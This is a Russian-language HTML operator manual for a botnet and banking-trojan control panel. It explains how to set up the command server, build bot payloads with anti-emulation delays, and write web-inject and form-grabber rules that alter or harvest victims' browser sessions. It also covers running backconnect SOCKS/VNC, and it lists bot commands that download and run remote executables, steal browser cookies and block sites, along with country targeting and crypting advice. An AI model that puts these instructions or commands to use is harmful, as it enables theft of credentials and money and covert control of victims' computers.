<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru"><head>
  <title>Руководство пользователя</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="Content-Style-Type" content="text/css">
  <meta http-equiv="Content-Script-Type" content="text/javascript">
	<style type="text/css">
	html, body {
		background:  #FFFFFF;
		color:       #000000;
		font-family: Verdana, Helvetica, sans-serif;
		font-size:   12px
	}
	
	a {
		color: #0060B6
	}
	
	a:hover {
		color: #174C7E
	}
	
	h1, h2 {
		padding:       0 0 0.5em 0;
		border-bottom: solid 1px #CCCCCC
	}
	
	h1 {
		padding-top: 0
	}
	
	table.list, table.samples, table.parameters {
		border-collapse: collapse
	}
	
	table.list td, table.samples td, table.parameters td {
		padding:    1em;
		background: #EEEEEE;
		border:     1px solid #CCCCCC
	}
	
	.text-block {
		padding: 0 0 0 10px;
	}
	</style>
</head>

<body>
<h1>Руководство пользователя</h1>
<ul>
	<li><a href="#cp_server">Настройка сервера</a></li>
	<li><a href="#cp_install">Установка панели</a></li>
	<li><a href="#cp_update">Обновление панели</a></li>
	<li><a href="#cp_builder">Создание билда</a></li>
	<li><a href="#cp_updater">Обновление бота</a></li>
	<li><a href="#config_hi">HTTP-инжекты/HTTP-грабберы</a></li>
	<li><a href="#cp_config">Раздел конфиг</a></li>
	<li><a href="#bc">Запуск backсonnect</a></li>
	<li><a href="#cp_task">Задания для бота</a></li>
	<li><a href="#rec">Рекомендации</a></li>
	<li><a href="#faq">FAQ</a></li>
</ul>

<!-- НАЧАЛО: Панель управления: Настройка сервера -->
<h2 id="cp_server">Панель управления: Настройка сервера</h2>
<p>Вам нужен "Выделенный сервер" (Дедик), рекомендуемая минимальная конфигурация:</p>
<ul>
  <li>2x процессор частотой 2Ггц.</li>
  <li>2Гб ОЗУ.</li>
  <li>Желательно SSD.</li>
	<li>Операционная система Linux.</li>
</ul>

<p><b>Интерпретатор PHP:</b></p>
<p>Последняя версия панели управления разрабатывалась на PHP <b>7.0</b>. Поэтому крайне рекомендуется использовать версию, не ниже этой версии.</p>
<p>Важно произвести следующие настройки в php.ini:</p>
<ul>
	<li>safe_mode = Off</li>
	<li>magic_quotes_gpc = Off</li>
	<li>magic_quotes_runtime = Off</li>
	<li>memory_limit = 128M или выше.</li>
	<li>post_max_size = 10M или выше.</li>
</ul>

<p>а также рекомендуется изменить следующие настройки:</p>
<ul>
	<li>display_errors = Off</li>
</ul>

<p>В конфигурации веб-сервера в случае с nginx, необходимо установить 
следующие опции. FastFlux и прокладки тоже должны уметь проксировать 
post запросы размером &gt;= 10M, не думаю что здесь будут проблемы. </p>
<ul>
	<li>client_max_body_size 10m; Или выше.</li>
</ul>
<b><i>В случае проблем с этими лимитами мы получим сообщения об ошибке при запуске бота, только в отладочном режиме.</i></b>

<p>В конфигурации mysql сервера, необходимо установить следующие опции: </p>
<ul>
	<li>max_allowed_packet = 10M или выше.</li>
</ul>

<p>Нам будут нужны дополнительные php библиотеки, выполняем команду:</p>
<table class="list">
	<tbody><tr> 
		<td>apt-get install php-mysqli php-curl php-mbstring</td>
	</tr>
</tbody></table>

<p>Устанавливаем TOR сервис для доступа к билдеру:</p>
<table class="list">
	<tbody><tr> 
		<td>apt-get install tor</td>
	</tr>
</tbody></table>

<p>Тор должен был быть запустится автоматически, но выполним команду:</p>
<table class="list">
	<tbody><tr> 
		<td>service tor start</td>
	</tr>
</tbody></table>

<p> Настройка сервера завершена. Если вы что-то упустили, то в процессе вы получите соответствующее уведомление.</p>
<p><b>После применения настроек необходим перезапуск соответствующих сервисов.</b></p>

<h2 id="cp_install">Панель управления: Установка</h2>
<p>Назначение файлов и папок:</p>
<table class="list">
	<tbody><tr><td>/core</td><td>системные файлы</td></tr>
	<tr><td>/logs</td><td>логи работы панели упраления</td></tr>
	<tr><td>/template</td><td>файлы темы (дизайн) </td></tr>
	<tr><td>/cp.php</td><td>вход в панель управления</td></tr>
	<tr><td>/gate.php</td><td>файл для отстука ботов</td></tr>
	<tr><td>/index.php</td><td>пустой файл для предотвращения листинга файлов</td></tr>
	<tr><td>/install.php</td><td>инсталлятор <b>(удалить или изменить имя файла после установки)</b></td></tr>
	<tr><td>/config.php</td><td>файл конфигурации будет создан после установки</td></tr>
	<tr><td>/defines.php</td><td>файл содержит константные значения, читайте ниже</td></tr>
</tbody></table>
<p>Панель управления лежит в папке web. Все содержимое этой папки необходимо загрузить на сервер.</p>
<p>Для nix-систем выставите права:</p>
<table class="list">
	<tbody><tr><td>/</td><td>777</td></tr>
  <tr><td>/logs</td><td>777</td></tr>
</tbody></table>
<p>После того как все файлы загружены и для них выставлены права, необходимо через браузер запустить инсталлятор <b>/install.php</b>.</p>
<p>
Вы можете изменить имена всех корневых файлов и папок после установки, 
добавив произвольный префикс к ним. Префикс можно изменить 
отредактировав файл <b>/defines.php</b>, открываем его через текстовый редактор.<br>
Ищим строку <b>define("CSR_PREFIX", "");</b> и заменяем её на <b>define("CSR_PREFIX", "pfx_");</b> где <b>pfx_</b> произвольное имя.
</p>
<p>Изменяем имена папок и файлов таким образом: </p>
<table class="list">
	<tbody><tr><td>/core</td><td>/pfx_core</td></tr>
	<tr><td>/logs</td><td>/pfx_logs</td></tr>
	<tr><td>/template</td><td>/pfx_template</td></tr>
	<tr><td>/cp.php</td><td>необходимо дать произвольное имя, например /enter.php</td></tr>
	<tr><td>/gate.php</td><td>необходимо дать произвольное имя, например /post.php</td></tr>
	<tr><td>/index.php</td><td>не изменяется</td></tr>
	<tr><td>/defines.php</td><td>не изменяется, желательно запретить доступ к файлу в конфиге веб-сервера отдавая 404 ошибку.</td></tr>
	<tr><td>/config.php</td><td>не изменяется, желательно запретить доступ к файлу в конфиге веб-сервера отдавая 404 ошибку.</td></tr>
</tbody></table> 
<p><b>Установка и настройка панели управления завершена.</b></p>

<h2 id="cp_update">Панель управления: Обновление</h2>
<p>1. Сделаем бекап, его можно сделать командой <b>cp -r</b> <i>www</i> <i>www-backup</i>, бекап нам понадобиться в дальнейшем.</p>
<p>2. Удаляем все содержимое из папки <i>www</i>.</p>
<p>3. Копируем файлы новой панели в папку <i>www</i>.</p>
<p>4. Копируем старый config.php из <i>www-backup</i> в <i>www</i>, без него будет запущен процесс установки.</p>
<p>5. Запускаем файл /install.php. Должен быть запущен процесс 
обновления, если вы увидели что запустился процесс установки, вы сделали
 что-то не так, смотрите предыдущий пункт.</p>
<p>6. Изменяем имена папок и файлов как было во время установки, можно 
задать новый префикс. Для файла /gate.php имя должно будет такое же как и
 у предыдущего.</p>
<p><b>Обновление панели управления завершено.</b></p>

<h2 id="cp_builder">Панель управления: Создание билда</h2>
<p>1. Заходим в раздел <b>Config</b> и указываем адресс билдер сервера в TOR. Также указываем наш лицензионный ключ.</p>
<p>2. Заходим в раздел <b>Builder</b> и заполняем поля.</p>
<table class="parameters">
	<tbody><tr>
		<td>Botnet</td><td>Имя ботнета.</td>
	</tr>
	<tr>
		<td>Marker</td>
		<td>
			Маркер загрузок, может быть необходим для отслеживания кол-ва загрузок с разных источников.<br>
			Не изменяется при обновлении бота.
		</td>
	</tr>
	<tr>
		<td>Servers</td><td>Список серверов для связи с панелью управления.</td>
	</tr>
	<tr>
		<td>Timeout</td><td>Время ожидания между запросами к серверу в минутах, игнорируется в отладочном режиме. <br>Можно изменить в разделе <b>Config</b>.</td>
	</tr>
	<tr>
		<td>Self remove</td><td>Самоудаление бота после установки.</td>
	</tr>
	<tr>
		<td>Debug</td>
		<td>
			Отладочный режим, игнорирует время ожидания между запросами к серверу, удобно для отладки инжектов и других тестов.<br>
			В случае если отладочный режим выключен будет задержка перед установкой/отстуком в районе 30-60сек, сделано для антиэмуляции.
		</td>
	</tr>
	<tr>
		<td>DLL</td><td>Создает билд в виде <b>.dll</b> библиотеки, для запуска используйте команду "rundll32.exe %DllPath%,DllRegisterServer".</td>
	</tr>
</tbody></table>
<br>
3. Жмем build и наблюдаем за прогресс баром, если все хорошо получаем билд.

<h2 id="cp_updater">Панель управления: Обновление бота</h2>
<p>Заходим в раздел <b>Updater</b>.</p>
<table class="parameters">
	<tbody><tr>
		<td>List of botnets</td> 
		<td>Список ботнетов для обновления, если оставить пустым, то будет применятся ко всем ботнетам.</td>
	</tr>
	<tr>
		<td>List of bots</td> 
		<td>Список ботов для обновления, если оставить пустым, то будет применятся ко всем ботам.</td>
	</tr>
	<tr>
		<td>URL</td> 
		<td>Адресс файла откуда панель будет тянуть файл, <b>этот url виден только для панели.<b></b></b></td>
	</tr>
	<tr>
		<td>Timeout check URL</td> 
		<td>Время ожидания между проверками на наличия нового файла.</td>
	</tr>
	<tr>
		<td>Enabled</td> 
		<td>Статус задания.</td>
	</tr>
</tbody></table><br>
Алогритм обновления бота происходит так, бот стучит в админку и 
проверяет есть ли для него задания на обновления. Приоритет строится так
 что сразу сравнивается список ботов, затем список ботнетов, затем общий
 таск если такой существует.<br>
Если таск найден, мы проверяем как давно файл проверялся и если пришло 
время его проверить мы запрашиваем указаный адресс для скачивания файла.
Файл скачиваеться и ложится в базу, обновляется его хеш и последнее 
время обновления.<br>
Если хеш файла в базе отличается от файла бота, бот скачивает и обновляет его.

<h2 id="config_hi">HTTP-инжекты/HTTP-грабберы.</h2><p>Изменить конфиг веб-инжектов можно в разделе WebInjects, бот их обновляет каждый раз при запросе к серверу.</p><p>Представляет
 из себя список URL'ов, для которых можно указать неограниченное 
количество либо вносимых в них изменений, либо получаемых из них данных.
 Текущий URL указывается следующей строкой:</p><p><b>set_url [url] [options] [postdata_blacklist] [postdata_whitelist] [matched_context]</b></p><p><b>Параметры:</b></p><table>




</table><table class="parameters">
	<tbody><tr>
		<td>url</td>
		<td>URL, на котором должен запускаться HTTP-инжект/HTTP-граббер. Допускается использование масок (символы * и #).</td>
	</tr>
	<tr>
		<td>options</td>
		<td>
			Определяет основные правила и условия для запуска, состоит из комбинации следующих символов:
			<ul>
				<li><b>P</b> - запускать при <a target="_blank" href="http://ru.wikipedia.org/wiki/HTTP#GET">POST-запросе</a>.</li>
				<li><b>G</b> - запускать при <a target="_blank" href="http://ru.wikipedia.org/wiki/HTTP#POST">GET-запросе</a>.</li>
				<li><b>L</b> - если этот сивол указан, то запуск происходит как HTTP-граббера, если не указан, то как HTTP-инжекта.
				</li><li><b>H</b> - дополняет символ "L", сохраняет содержимое без 
вырезания HTML-тегов. В обычном же режиме, все HTML-теги удаляются, а 
некоторые преобразуются в символ "новая строка" или "пробел".</li>
				<li><b>I</b> - сравнивать параметр url без учета регистра (только для англ. алфавита).</li>
				<li><b>C</b> - сравнивать конекст без учета регистра (только для англ. алфавита).</li>
				<li><b>B</b> - блокировка выполнения инжекта.</li>
			</ul>
		</td>
	</tr>
	<tr>
		<td>postdata_blacklist</td>
		<td>Полное (от начала до конца) содержимое POST-данных, при котором <b>не должен</b> происходить запуск. Допускается использование масок (символы * и ?).<br><br>Параметр является необязательным.</td>
	</tr>
	<tr>
		<td>postdata_whitelist</td>
		<td>Полное (от начала до конца) содержимое POST-данных, при котором <b>должен</b> происходить запуск. Допускается использование масок (символы * и ?).<br><br>Параметр является необязательным.</td>
	</tr>
	<tr>
		<td>matched_context</td>
		<td>Подсодержимое (подстрока) содержимого страницы, при котором должен
 происходить запуск. Допускается использование масок (символы * и ?).<br><br>Параметр является необязательным.</td>
	</tr>
</tbody></table>
<p>Со следующей строки начинается список изменений вносимых, в 
содержимое URL, а при наличии символа "L" в параметре options - список 
данных, получаемых из содержимое URL. Это список длится до тех пор, пока
 не достигнут конец файла, или не задан новый URL.</p><p>Единица списка состоит из трех элементов в произвольном порядке:</p>
<table class="parameters">
	<tbody><tr>
		<td>data_before</td>
		<td>
			<b>При отсутвие символа "L" в параметре options:</b>
			<p>Подсодержиоме в соедржимом URL, после окончания которого нужно внести новые данные.</p>
			<b>При наличии символа "L" в параметре options:</b>
			<p>Подсодержиоме в соедржимом URL, после окончания которого нужно начать получить данные для отчета.</p>
			Допускается использование масок (символы * и ?).
		</td>
	</tr>
	<tr>
		<td>data_after</td>
		<td>
			<b>При отсутвие символа "L" в параметре options:</b>
			<p>Подсодержиоме в соедржимом URL, передкоторым нужно закончить новые данные.</p>
			<b>При наличии символа "L" в параметре options:</b>
			<p>Подсодержиоме в соедржимом URL, после окончания которого нужно закончить получать данные для отчета.</p>
			Допускается использование масок (символы * и ?).
		</td>
	</tr>
	<tr>
		<td>data_inject</td>
		<td>
			<b>При отсутвие символа "L" в параметре options:</b>
			<p>
				Новые данные, который будут внесены между данными найденысмм по data_before и data_after. <br>
				Допускаеться использование макроса <b>%BOTID%</b>, <b>%BOTNET%</b>, <b>%SOCKS%</b>.
			</p>
			<b>При наличии символа "L" в параметре options:</b>
			<p>Подсодержиоме в соедржимом URL, после окончания которого нужно закончить получать данные для отчета.</p>
		</td>
	</tr>
</tbody></table>

<h2 id="cp_config">Раздел конфиг</h2>
<p>1) Настройки для панели.</p>
<table class="samples">
	<tbody><tr>
		<td>Builder address</td>
		<td>onion адресс для доступа к билдеру.</td>
	</tr>
	<tr>
		<td>License key</td>
		<td>ваш лицензионный ключ.</td>
	</tr>
	<tr>
		<td>Timeout</td>
		<td>время ожидания в минутах между запросами к серверу.</td>
	</tr>
</tbody></table>
<p>2) Динамическая конфигурация, эту конфигурацию бот обновляет каждый раз при запросе к серверу.</p>
<table class="samples">
	<tbody><tr>
		<td>Backconnect host</td>
		<td>IP адресс backconnect сервера.</td>
	</tr>	
	<tr>
		<td>Advanced servers</td>
		<td>резервные домены на случай если основые домены будут заблокированы.</td>
	</tr>
	<tr>
		<td>Web filters</td>
		<td>
			<b>При наличии символа "!":</b>
			<p><i>!http://*</i> - отфильтрует все post запросы к http ресурсам.</p>
			<p><i>!*://*facebook.*</i> - отфильтрует все post запросы к facebook.</p>
			
			<b>При наличии символа "^":</b><br>
			<p><i>^http://*</i> - заблокирует доступ ко всем http ресурсам.</p>
			<b>Это были примеры, не стоит блокировать доступы и фильтровать все запросы к http.</b>
		</td>
	</tr>
</tbody></table>

<!-- НАЧАЛО: Работа с Backсonnect-сервером -->
<h2 id="bc">Запуск backсonnect</h2>
1) Для запуска сервиса достаточно запустить файл <b>bcs.exe</b> с правами администратора. Права нужны для отключения брандмаузера, чтобы избавить вас от лишних манипуляций.<br><br>
В панели управления заходим в раздел <b>Config</b> и указываем ip адресс нашего сервера, далее заходим на страницу с ботом и пробуем открыть сокс/внц.
<!-- КОНЧАЛО: Работа с Backсonnect-сервером -->

<h2 id="cp_task">Задания для бота</h2>
<ul>
  <li><p><b>user_execute</b> [path] [parameters]</p>
    <p>Запуск процесса от имени текущего пользователя.</p>
    <p><b>Примеры:</b></p>
    <table class="samples">
      <tbody><tr>
        <td>user_execute http://server.com/hvnc.exe</td>
        <td>Download the file in "%TEMP%\random_name.exe" and execute it.</td>
      </tr>
      <tr>
        <td>user_execute http://server.com/my.exe /param1 /param2</td>
        <td>Download the file in "%TEMP%\random_name.exe" and execute it with parameters.</td>
      </tr>
    </tbody></table>
  </li>

  <li><p><b>user_cookies_get</b></p>
    <p>Получение кукисов всех известных браузеров.</p>
  </li>

  <li><p><b>user_cookies_remove</b></p>
    <p>Удаление всех кукисов из всех известных браузеров.</p>
  </li>
	
	<li><p><b>user_url_block</b> [url_1] [url_2] ... [url_X]</p>
    <p>Блокировка доступа к URL для текущего пользователя. <u>Вызов этой команды не обнуляет существующий список блокировки, а дополняет его.</u><br><br>
    </p><p><b>Параметры:</b></p>
    <table class="parameters">
      <tbody><tr>
        <td>url_1, ulr_2, ...</td>
        <td>URL'ы, к котором необходимо заблокировать доступ. Допускается использование масок (символы * и #).</td>
      </tr>
    </tbody></table>
    <p><b>Примеры:</b></p>
    <table class="samples">
      <tbody><tr>
        <td>user_url_block http://www.google.com/*</td>
        <td>Блокировка доступа к любому URL на http://www.google.com/.</td>
      </tr>
      <tr>
        <td>user_url_block *</td>
        <td>Полная блокировка доступа к любому ресурсу.</td>
      </tr>
    </tbody></table>
  </li>

  <li><p><b>user_url_unblock</b> [url_1] [url_2] ... [url_X]</p>
    <p>Снятие блокировки доступа к URL для текущего пользователя.</p>
    <p><b>Параметры:</b></p>
    <table class="parameters">
      <tbody><tr>
        <td>url_1, ulr_2, ...</td>
        <td>Маски (символы * и #), по которым из списка заблокированных URL необходимо удалить URL.</td>
      </tr>
    </tbody></table>
    <p><b>Примеры:</b></p>
    <table class="samples">
      <tbody><tr>
        <td>user_url_unblock *.google.*</td>
        <td>Удалить блокировку по любому URL из списка заблокированных, которые содержат в себе ".google.".</td>
      </tr>
      <tr>
        <td>user_url_unblock *</td>
        <td>Полностью очистит список блокировок URL.</td>
      </tr>
    </tbody></table>
  </li>
	
	<li><p><b>bot_uninstall</b></p>
    <p>Полное удаление бота из текщего пользователя. Данная команда 
будет исполнена после исполнения всего скрипта, независимо от позиции в 
скрипте.</p>
  </li>
</ul>

<h2 id="rec">Рекомендации</h2>
<p>1) Используйте https вместо http.</p>
<p>2) Перед прогрузкой запустите файл на XP и W10. В случае проблем с отстуком на XP смотрите раздел FAQ.</p>
<p>3) Отладочный режим должен быть обязательно выключен, вы не должны 
были видить окно с сообщениям об отладочном режиме во время запуска, 
которые вы делали в предыдущем пункте .</p>
<p>4) Установить в разделе <b>Blacklist</b> список разрешеных стран которые будем грузить, все остальные страны стучать не будут.</p>

<h2 id="faq">FAQ</h2>

<p><b>1. Не получается создать билд.</b></p>
<p>1) Если зависает прогресс бар при создание билда без отображения каких либо ошибок, то скорее всего вы не установили <b>max_allowed_packet</b> для mysql, см. раздел <a href="#cp_server">настройка сервера</a>. </p>

<p><b>2. Не стучит на XP.</b></p>
<p>1) В случае если вы испольузете https протокол для соединения бота с 
панелью управления, вам нужно включить на веб-сервере поддержку старых 
TLS протоколов и алгоритмов шифрования. XP не поддерживает самые новые 
версии TLS.</p>

<p><b>3. Не стучит.</b></p>
<p>1) Проверьте нету ли вас в блоклистах админки. Возможно вы установили
 список разрешеных стран, а запускаемый вами бот имеет ip другой страны.</p>
<p>2) Работает ли вообще сервер. Откройте браузер и попробуйте зайти по 
одному из серверов указаных при билде, должна быть чистая страница.</p>

<p><b>4. Критическая ошибка при запуске файла.</b></p>
<p>1) В случае запуска криптованого файла, вам необходимо обратится к человеку/сервису который криптовал файл. </p>
<p>2) Если файл был не криптованый, свяжитесь со мной. </p>

<p><b>5. Боты не верно отображают IP адресса.</b></p>
<p>Панель управления берет ip адресс бота с заголовка <b>HTTP_X_REAL_IP</b>, если такой существует, иначе через страндартный <b>REMOTE_ADDR</b>.</p>
<p>1) В случае использования FustFlux необходимо уточнить у операторов 
через какой именно заголовок они пробрасывают реальный ip бота и 
настроить наш веб-сервер чтобы он пробрасывал ip от FastFlux в нужные 
нам заголовки.</p>
<p>2) В случае использование прокладки, проделываем тоже самое как и с FustFlux.</p>

<p><b>6. Не работают инжекты и форм-граббер.</b></p>
<p>1) Скорее всего у вас запущен <b>Proxifier</b>, если запустить бота в отладочном режиме будет соответствующее окно с уведомление о конфликте.</p>

<p><b>7. Не работают инжекты.</b></p>
<p>1) Попробуйте самый простой инжект для заголовка страницы и проверить его, возможно ошибка в ваших инжектах.</p>
<table class="samples">
	<tbody><tr>
		<td>
			set_url https://* G <br><br>
			data_before <br>
			&lt;title&gt;<br> 
			data_end<br><br>
			
			data_after <br>
			&lt;/title&gt;<br> 
			data_end<br><br>
			
			data_inject <br>
			INJECT<br> 
			data_end<br><br>
		</td>
	</tr>
</tbody></table><p><b>8. Не работает поиск по отчетам, хотя даты в поиске есть.</b></p><p>1) Сделайте такой запрос в консоле mysql:</p><table>



</table><table class="samples">
	<tbody><tr>
		<td>set global sql_mode=(select replace(@@sql_mode,'ONLY_FULL_GROUP_BY',''))</td>
	</tr>
</tbody></table>

<p><b>9. Can't upload a large file....</b></p>
<p>1) При запуске в отладочном режиме бот проверяет может ли он 
загрузить на сервер файл размером в 10M, в случае ошибки получаем 
уведомление. Скорее всего вы не увеличили лимиты для post запросов, см. 
раздел <a href="#cp_server">настройка сервера</a>.</p>

<b>Если рекомендации не помогли или же вы не нашли решения вашей проблемы, свяжитесь со мной.</b>


</body></html>